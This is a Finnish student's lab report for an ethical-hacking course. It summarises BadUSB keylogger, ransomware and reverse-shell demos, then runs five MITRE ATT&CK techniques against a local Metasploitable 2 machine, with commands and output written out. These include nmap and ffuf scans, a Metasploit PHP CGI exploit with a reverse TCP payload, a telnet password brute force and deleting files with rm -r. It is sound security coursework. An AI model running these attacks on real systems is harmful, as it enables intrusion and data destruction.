# Attaaack
Juho Tuovinen

Tässä raportissa aioin kertoa kuinka suoritin tehtävät, jotka on annettu Haaga Helian Tunkeutumisteustaus kurssilla. Tehtävät löytyvät [täältä](https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#h6-attaaack).

Tietokoneen speksit, jolla suoritan toimenpiteen:
- Apple MacBook 2015
- macOs Monterey versio 12.7
- Ram -muistia 16GB
- levytilaa/muistia vapaana 22,66 GB.

Ohjelmistot
- UTM Version 4.1.6 (75)
- VM OS: Kali Linux 2023.3 (kali-rolling)


## Lue/katso/kuuntele ja tiivistä. (Tässä x-alakohdassa ei tarvitse tehdä testejä tietokoneella, vain lukeminen tai kuunteleminen ja tiivistelmä riittää. Tiivistämiseen riittää muutama ranskalainen viiva.)

- Yehoshua and Kosayev 2021: [Antivirus Bypass Techniques](https://learning.oreilly.com/library/view/antivirus-bypass-techniques/9781801079747/), luku:
  - [Chapter 1: Introduction to the Security Landscape](https://learning.oreilly.com/library/view/antivirus-bypass-techniques/9781801079747/B17257_01_Epub_AM.xhtml#_idParaDest-18)
- Halonen, Rajala ja Ollikainen 2023: [PhishSticks Youtube Channel](https://www.youtube.com/@phishsticks_pentest/videos), kahdeksan videota, yhteensä noin 15 min
  - [PhishSticks - The Ethical Hackers tool for BadUSB](https://www.youtube.com/watch?v=bDzVevtZiWE): Videossa esitellään kuinka tavallisen näköinen USB-tikku voikin olla haitallinen laite. Liittäessä USB-tikun koneeseen, laite ajaa komentoja, joka käynnistää keyloggerin. Keylogger lähettää hyökkääjälle kaiken, mitä uhri kirjoittaa tietokoneellaan. Näin voidaan varastaa esimerkikis uhrin käyttäjätunnukset.
  - [Ethical Hacking with USB device - Reverse Shell](https://www.youtube.com/watch?v=ll4ojo6q-rM): Videossa esitellään, kuinka saadaan uhrin kone haltuun reverse shellillä, käyttämällä haitallista tiedostoa.
  - [Ethical Hacking with Digispark - Keylogger with HTTP POST requests](https://www.youtube.com/watch?v=XZkK8vzhyMw): Videossa demotaan aikaisempaa keyloggeria. Kun digisparks- laite kiinnitetään uhrin koneeseen, se ajaa komentoja ja aloittaa näppäimistön nauhoituksen taustalla. Nauhoitus tallennetaa tiedostoon, pilveen, josta hyökkääjä voi sen hakea.
  - [Ethical Hacking with Digispark - Keylogger initial demo](https://www.youtube.com/watch?v=sWYUGl7JiFA): Vastaavanlainen keylogger digisparkissa kuin aikaisempi. Digisparkin ollessa kiinni laitteessa, se nauhoittaa uhrin näppäimistön kirjoitusta ja lähettään ne hyökkääjän sähköpostiin.
  - [Ethical hacking with Digispark - ransomware initial demo](https://www.youtube.com/watch?v=Bi2QOMSHeKI): Videossa esitellään kiristyshaittaohjelmaa. Kun digisparks- laitteen laitta koneesee, ajetaan powershell skripti. Haittaohjelma kryptaa tiedostot ja vaatii salasanaa tiedostone dekryptaamiseen.
  - [Ransomware initial testing demo](https://www.youtube.com/watch?v=glqK_-qdDkw): Videossa demotaan aikaisempaa kiristyshaittaohjelmaa. Ohjelma kryptaa tiedot ja oikealla salasanalla ne dekryptataan.
  - [Reverse Shell - Initial testing demo](https://www.youtube.com/watch?v=h5MMKu6TMxg): Avaamalla haitallinen kansio, saadaan luotua reverse shell yhteys hyökkääjän ja uhrin koneen välille.
  - [BadUSB Reverse Shell using Flipper Zero](https://www.youtube.com/watch?v=1kqqIdBoKr0): Flipper Zero toimii näppäimistön lailla ja ajaa powershell komentoja, luoden reverse shell yhteyden uhrin koneeseen.
 

- Halonen, Rajala ja Ollikainen 2023: [PhishSticks Git Repository](https://github.com/therealhalonen/PhishSticks/), sivut:
  - [README.md](https://github.com/therealhalonen/PhishSticks/tree/master) (Aikajärjestyksessä, jos aloitat pohjalta. Kuvailee, miten näitä tekniikoita opeteltiin ja kehitettiin)
    - PhishSticks on Infra Project 2023 -kurssille tehty projekti. Projektin tavoitteena on luoda työkalu eettiseen tunkeutumistestaukseen tekemällä simuloitu hyökkäys käyttämällä haitallista USB-laitetta. Erilaisia haittaohjelmia ovat muun muassa keylogger, ransomware ja reverse shell.
    - Week 38: työ on aloitettu ja GItHub-sivut projektille luotu
    - Week 39: alustavia käsikirjoituksia tehty. Tutkimustyöt reverse shelliin ja lunnasohjelmaa koskien on aloitettu. Digispaarksit saapuivat. Alustavan graafinen käyttöliittymän lunnasohjelmaa varten tehty. Youtube-tili luotu.
    - Week 40: Fyysisen BadUSB-prototyypi tehty. Suomenkielinen ulkoasu Digisparks DigiKeyboardille. Edistytty hieman Python-hyötykuorman muuntamisessa suoritettavaksi tiedostoksi. 
    - Week 41: Payloadit ovat nyt onlinereita (= nopeampi suoritus). Reverse shell ja lunnasohjelma alkavat olla demokunnossa.
    - Week 43: keylogger payloadia hiottu. 2 toimivaa keylogger skriptiä, jotka ohittavat Windowd Defenderin.
    - Week 44: Youtube- video julkaistiin; demo keyloggerista
    - Week 47: On tutkittu kuinka voidaan torjua hyökkäys. Windows Defender on alkanut huomata lunnasohjelman.
    - Week 48: Uusi informatiivinen video projektista ulkona. Projektia esitelty Tero Karvisen tunkeutumistestauskurssilla sekä HelSec:n tapahtumassa.
  - [Revshell](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/revshell)
   - Kun yrityksen raportin pikakuvaketta klikataan, ladataan väärennetty raport.txt-tiedosto ja netcat. Kun lataukset on suoritettu, tiedosto aukeaa samalla kun käynnistetään reverse shell hyökkääjän hallitsemaan tietokoneeseen.

  - [Mitigations](https://github.com/therealhalonen/PhishSticks/blob/master/documentation/Mitigations.md)
    - Estämistoimet:
      - Powershellin käytön poistaminen käytöstä
      - Powershellin estäminen Windowsin palomuurista
      - Poista Windows Run tavallisen käyttäjän käytöstä
      - Valvottu kansioiden käyttöoikeus
      - Irrotettavien laitteiden poistaminen käytöstä
        
  - [Installing Windows 10 on a virtual machine](https://github.com/therealhalonen/PhishSticks/blob/master/notes/ollikainen/windows.md)
    - Windowd 10 asennusohje
    - asennetaan VirtualBoxiin virtuaaliseksikoneeksi
    - käytetään Host-Only -vaihtoehtoa VirtualBoxissa, jotta kone on samassa verkossa kuin hyökkääjäkone, muttai ei kuitenkaan yllä internettiin
    
- [MITRE Att&ck Frequently Asked Questions](https://attack.mitre.org/resources/faq/): Part 1. General
  - ATT&CK koostuu kahdesta osasta: ATT&CK for Enterprise, joka kattaa yritysten IT-verkkoihin ja pilvipalveluihin kohdistuvan käyttäytymisen, ja ATT&CK for Mobile, joka keskittyy mobiililaitteisiin kohdistuvaan käyttäytymiseen
  - tactics: vastustajan taktinen tavoite ja syy miksi toimitaan
  - techniques: miten vastustaja saavuttaa taktisen tavoitteensa suorittamalla jonkin toiminnon
  - sub-techniques: tarkempi kuvaus tekniikoista tavoitteeseen pääsemiseksi
  - procedures: tekniikoiden tai alatekniikoiden erityinen toteutus, jota vastustaja käyttää

- [MITRE Att&ck Enterprise Matrix](https://attack.mitre.org/)
  - 

## a) The OS pwns you. Asenna Windows virtuaalikoneeseen samaan verkkoon hyökkäyskoneen (esim. Kali, Debian) kanssa. Kokeile, että saat koneen irrotettua Internetistä.

Käytin aikesempaa ohjetta: https://github.com/therealhalonen/PhishSticks/blob/master/notes/ollikainen/windows.md Windowsin asennukseen. Latasin English (Great Britain), ISO – Enterprise LTSC, 64-bit edition -version lähteestä https://www.microsoft.com/en-us/evalcenter/download-windows-10-enterprise.


Kokeilin asentaa UTM:lle, mutta ei onnistunut. Kokeilien "Virtualize" ja "emulate" -vaihtoehtoja mutta sain aina saman virheen.
Vaihdoin välissä VirtualBoxiin ja siellä tilanne näytti hetken paremmalta; kone lähti käyntiin. Kuitenkin käynnistys oli tavanomaisempaa hitaampaa, joten kone oli pakko poistaa. Sillä ei pystynyt työskentelemään. Muistelin että olen joskus ladannut koneen täältä: https://www.microsoft.com/en-us/software-download/windows10ISO. Ei toiminut, sama virhe. Kokeilin muuttaa Ram muistin määrää sekä levytilna määrää, mutta ei auttanut. 

<img src="/images/error1.png" alt="" title="" width="70%" height="70%">

Muistelin, että olen aikaisemmin Tero Karvisen Infa kurssilla asentanut windows virtuaalikoneen. Löysinkin [raporttini](https://github.com/JuhoTuovinen/linux-course/blob/main/h5-Vaihtoehdot.md), jossa olen koneen asentanut aikaisemmin. Olen kuitenkin ladannut samasta paikasta ISO_tiedoston kuin aikaisemmin ja käyttänyt UTM:ää, mutta kuitenkaan tämä ei nyt toimi. Aioa syy mitä keksin, on levytilan puute. Minulla on nyt 43 gigaa muistia.

Kokeilin hetken päästä asentaa konetta uudelleen ja sain sen toimimaan seuraavilla spekseillä:

<img src="/images/settings1.png" alt="" title="" width="70%" height="70%">
<img src="/images/settings2.png" alt="" title="" width="70%" height="70%">

Toimii!
<img src="/images/win1.png" alt="" title="" width="70%" height="70%">

Virhe johtui siis vähäisestä muistista. Aiemmin testatessa minulla oli muistia 20 gigaa, mutta siivosin konetta ja nostin sitä 40:een ja tämä oli tarpeeksi virtuaalikoneen pyörittämiseen. 

Valitsin Host-Only verkkovaihtoehdon, jolloin kone ei ole yhteydessä internettiin, mutta samasssa verkossa hyökkäyskoneen kanssa.

<img src="/images/ping10.png" alt="" title="" width="70%" height="70%">
<img src="/images/ping11.png" alt="" title="" width="70%" height="70%">

## b) Trustme.lnk. Kokeile PhishSticksin [revshell](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/revshell) vihamielistä tiedostoa, joka avaa käänteisen shellin hyökkääjän koneelle. Selitä, mitä tapahtuu ja miksi. Testaa, että pysyt antamaan kohdekoneelle komentoja reverse shellin kautta.




## d) PageRank. Laita [linkki raporttiisi kurssisivun kommentiksi](https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#comments).

Github -varastoni, jossa kotitehtävät, on nyt lisätty sivulle.

<img src="/images/laksy2.png" alt="" title="" width="70%" height="70%">


## c) Attaaack! [MITRE Attack Enterprise Matrix](https://attack.mitre.org/): Demonstroi viisi tekniikkaa viidestä eri taktiikasta.

### 1. Discovery/TA0043 - [Network Service Discovery/T1046](https://attack.mitre.org/techniques/T1046/)

Hyökkääjät voivat yrittää saada tietoa lähiverkon palveluista, sillä joku palvelu voi olla haavoittuvainen. Yleisiä menetelmiä näiden tietojen hankkimiseksi ovat portti- ja/tai haavoittuvuusskannaukset sopivien työkalujen avulla.

Ennen testiä tarkistin, ettei kone yllä internettiin. Sen jälkeen laitoin Apache-palvelimen pystyyn, jotta saisimme edes jonkinlaisia tuloksia porttiskannauksesta.

    sudo systemctl start apache2

Nyt tiedetään, että portti 80 pitäisi olla ainakin auki. Tehdään porttiskannaus omaan koneeseen:

    sudo nmap -A localhost  

Tulokset:

``````
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-02 23:50 EET
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000086s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Network Distance: 0 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds
``````

Skannauksesta näemme, että portti 80 auki ja siellä on apache-palvelin pystyssä. <code>-A</code> viittaa agressiiviseen skannaukseen, ja tämä paljastaa mm. palvelimen käyttöjärjestelmän ja se version. Tätä tietoa voi hyödyntää exploitien käyttämisessä.


### 2. Reconnaissance/TA0043 - [Active Scanning: Wordlist Scanning/T1595.003](https://attack.mitre.org/techniques/T1595/003/)


Tässä tekniikassa käytetään samankaltaisia menetelmiä kuin brute forcessa, sen tavoitteena on pikemminkin sisällön ja infrastruktuurin tunnistaminen. Tekniikassa käytetyt sanalistat voivat sisältää yleisiä, yleisesti käytettyjä nimiä ja tiedostopäätteitä tai tiettyyn ohjelmistoon liittyviä termejä. Vastustajat voivat esimerkiksi käyttää verkkosisällön etsintätyökaluja, kuten Dirb, DirBuster ja GoBuster, sekä yleisiä tai mukautettuja sanalistoja luettelemaan verkkosivuston sivuja ja hakemistoja, jotka voivat olla vanhentuneita ja haavoittuvaisisa.

Tässä testissä käytän aikaisemmin kurssilla käytettyä ffuf- työkalua. Kohteeni on Metasploitable 2.

    ./ffuf -w common.txt -u http://192.168.12.3/FUZZ

- <code>./ffuf</code>: sovellus
- <code>-w common.txt</code>: käyetään sanalistaa "common.txt"
- <code>[-u http://192.168.12.3](http://192.168.12.3/FUZZ)</code>: kohdeosoite ja "FUZZ"- kohtaan fuzzataan.

Tulokset:

`````
[Status: 403, Size: 289, Words: 22, Lines: 11, Duration: 11ms]
    * FUZZ: .hta

[Status: 403, Size: 294, Words: 22, Lines: 11, Duration: 14ms]
    * FUZZ: .htaccess

[Status: 403, Size: 293, Words: 22, Lines: 11, Duration: 27ms]
    * FUZZ: cgi-bin/

[Status: 301, Size: 315, Words: 21, Lines: 10, Duration: 11ms]
    * FUZZ: dav

[Status: 403, Size: 294, Words: 22, Lines: 11, Duration: 2703ms]
    * FUZZ: .htpasswd

[Status: 200, Size: 891, Words: 237, Lines: 30, Duration: 158ms]
    * FUZZ: index.php

[Status: 200, Size: 891, Words: 237, Lines: 30, Duration: 366ms]
    * FUZZ: index

[Status: 301, Size: 322, Words: 21, Lines: 10, Duration: 9ms]
    * FUZZ: phpMyAdmin

[Status: 200, Size: 48029, Words: 2409, Lines: 657, Duration: 275ms]
    * FUZZ: phpinfo.php

...( jatkuu )...
`````


### 3. Initial Access/TA0001 - [Exploit Public-Facing Application/T1190](https://attack.mitre.org/techniques/T1190/)

Argument Injection- hyökkäys PHP CGI:ssä. Haavoittuvuus johtuu virheestä, jossa haavoittuva ohjelmisto käsittelee haitallista pyyntöä. Sen avulla hyökkääjä voi suorittaa mielivaltaista koodia muokatun URI:n kautta.

Aikaisemmasta fuzzauksesta löysimme <code>/phpinfo.php</code> hakemiston, josta löytyy tietoa palvelimesta.

<img src="/images/php5.png" alt="" title="" width="70%" height="70%">

Avataan metasploit framework console <code>msfconsole</code> ja etsitään sopiva exploit. Käytin tässä apuna [How To Hack and Exploit Port 80 HTTP Metasploitable 2 Full Walkthrough - Home Hacking Lab Video 11](https://www.youtube.com/watch?v=HH7DPfYTfoI) -videota.

``````
msf6 > search php_cgi

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/multi/http/php_cgi_arg_injection  2012-05-03       excellent  Yes    PHP CGI Argument Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/php_cgi_arg_injection
``````
Exploitti löytyi joten käytetään sitä. 

`````
msf6 exploit(multi/http/php_cgi_arg_injection) > use 0
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(multi/http/php_cgi_arg_injection) > set rhosts 192.168.12.3
rhosts => 192.168.12.3
msf6 exploit(multi/http/php_cgi_arg_injection) > exploit

[*] Started reverse TCP handler on 192.168.12.2:4444 
[*] Exploit completed, but no session was created.

``````

Jostain syystä sain virheilmoituksen, että sessiota ei luotu. Syy tuntematon. Näin se olisi käytännössä kuitenkin tapahtunut, jos exploit olisi toiminut. Videossa tässä kohtaa kuitenkin yhteys saadaan luotua ja päästää koneeseen käsiksi.

### 4. Credential Access/TA0006 - [Brute Force: Password Guessing/T1110.00](https://attack.mitre.org/techniques/T1110/001/)

Tunkeilijat, joilla ei ole ennakkotietoa järjestelmän tai ympäristön laillisista tunnuksista, voivat arvata salasanoja ja yrittää päästä tileille. Ilman tietoa tilin salasanasta hyökkääjä voi päätyä arvaamaan salasanan järjestelmällisesti toistuvalla tai iteratiivisella mekanismilla. Tunkeilija voi arvailla kirjautumistunnuksia ilman ennakkotietoa järjestelmän tai ympäristön salasanoista operaation aikana käyttämällä luetteloa yleisistä salasanoista. 

Suoritin Nmap -tiedustelun kohteeseen, varmistetaan että telnet on auki. Telnet on avoin. Käytin tehtävässä apuna Exploiting [Metasploitable 2 - Brute Force Attack for Telnet Password](https://www.youtube.com/watch?v=EavbD2EWzVA) -videota.

    23/tcp   open  telnet

Aion käyttää rockyou.txt -sanalistaa apuna salasanan kräkkäämisessä. Lista on Kalissa valmiiksi asennettuna polkuun <code>/usr/share/wordlists</code>.

Avataan metasploit ja etsitään "telnet_login" -hakusanalla exploitia.

`````

msf6 > search telnet_login

Matching Modules
================

   #  Name                                                              Disclosure Date  Rank    Check  Description
   -  ----                                                              ---------------  ----    -----  -----------
   0  auxiliary/admin/http/netgear_pnpx_getsharefolderlist_auth_bypass  2021-09-06       normal  Yes    Netgear PNPX_GetShareFolderList Authentication Bypass
   1  auxiliary/scanner/telnet/telnet_login                                              normal  No     Telnet Login Check Scanner


`````
Haluamme tässä käyttää 1. Seuraavaksi asetetaan tarvittavat tiedot.

``````
msf6 auxiliary(scanner/telnet/telnet_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE => /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/telnet/telnet_login) > set RHOSTS 192.168.12.3
RHOSTS => 192.168.12.3
msf6 auxiliary(scanner/telnet/telnet_login) > set USERNAME msfadmin
USERNAME => msfadmin
msf6 auxiliary(scanner/telnet/telnet_login) > run

``````

Salasanan kräkkääminen alkoi rockyou -listasta. Koska lista on järkyttävän pitkä ,ja jotta minulla ei menisi loppupäivää kräkätessä, tein oman listan, joka on lyhyempi. Tiedän, että tunnukset käyttäjälle on msfadmin:msfadmin, joten tein salasanalistan muutamasta salasanasta ja msfadmin -salasana lisättynä listaan. Ajan hyökkäyksen uudestaan.

``````
cat /usr/share/wordlists/telnet.txt
root
admin
password
123123
msfadmin
``````

Kokeilen uudestaan.

``````
msf6 auxiliary(scanner/telnet/telnet_login) > set RHOSTS 192.168.12.3
RHOSTS => 192.168.12.3
msf6 auxiliary(scanner/telnet/telnet_login) > set PASS_FILE /usr/share/wordlists/telnet.txt
PASS_FILE => /usr/share/wordlists/telnet.txt
msf6 auxiliary(scanner/telnet/telnet_login) > set USERNAME msfadmin
USERNAME => msfadmin
msf6 auxiliary(scanner/telnet/telnet_login) > run

[!] 192.168.12.3:23       - No active DB -- Credential data will not be saved!
[-] 192.168.12.3:23       - 192.168.12.3:23 - LOGIN FAILED: msfadmin:root (Incorrect: )
[-] 192.168.12.3:23       - 192.168.12.3:23 - LOGIN FAILED: msfadmin:admin (Incorrect: )
[-] 192.168.12.3:23       - 192.168.12.3:23 - LOGIN FAILED: msfadmin:password (Incorrect: )
[-] 192.168.12.3:23       - 192.168.12.3:23 - LOGIN FAILED: msfadmin:123123 (Incorrect: )
[+] 192.168.12.3:23       - 192.168.12.3:23 - Login Successful: msfadmin:msfadmin
[*] 192.168.12.3:23       - Attempting to start session 192.168.12.3:23 with msfadmin:msfadmin
[*] Command shell session 1 opened (192.168.12.2:40249 -> 192.168.12.3:23) at 2023-12-03 15:26:51 +0200
[*] 192.168.12.3:23       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
``````

Saimme salasanan murrettua! Kokeillaa sissänkirjautumista ja se onnistui.

``````
metasploitable login: msfadmin
Password: 
Last login: Sun Dec  3 08:26:44 EST 2023 on pts/1
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

msfadmin@metasploitable:~$ whoami
msfadmin
```````


### 5. Impact/TA0040 - [Data Destruction/T1485](https://attack.mitre.org/techniques/T1485/)

Hyökkääjät voivat tuhota tietoja ja tiedostoja järjestelmissä tai verkossa keskeyttääkseen järjestelmien, palvelujen ja verkkoresurssien saatavuuden. Tietojen tuhoaminen tekee tallennetuista tiedoista todennäköisesti sellaisia, ettei niitä voida palauttaa rikosteknisin menetelmin.

Kun olimme telnet-yhteydellä sisällä, päätin alkaa tuhoamaan tiedostoja ja kansioita.

`````
msfadmin@metasploitable:~$ ls
vulnerable
msfadmin@metasploitable:~$ cd vulnerable/
msfadmin@metasploitable:~/vulnerable$ ls
mysql-ssl  samba  tikiwiki  twiki20030201
`````
POistan kaikki kansiot komennolla <code>rm -r [kansion nimi]</code>

``````
msfadmin@metasploitable:~/vulnerable$ ls
msfadmin@metasploitable:~/vulnerable$ 
``````
Nyt kansiota ja niiden sisältöä ei ole enää olemassa. Ne ovat tuhottu.

[Data Destruction](https://attack.mitre.org/techniques/T1485/) -kuvauksessa kerrotaan, että del ja rm, poistavat usein vain osoittimet tiedostoihin pyyhkimättä itse tiedostojen sisältöä, jolloin tiedostot ovat palautettavissa asianmukaisin rikosteknisin menetelmin. Joten on siis mahdollista, että tiedot voidaan palauttaa, mutta tämä testi demonstroi tilannetta käytännössä. 

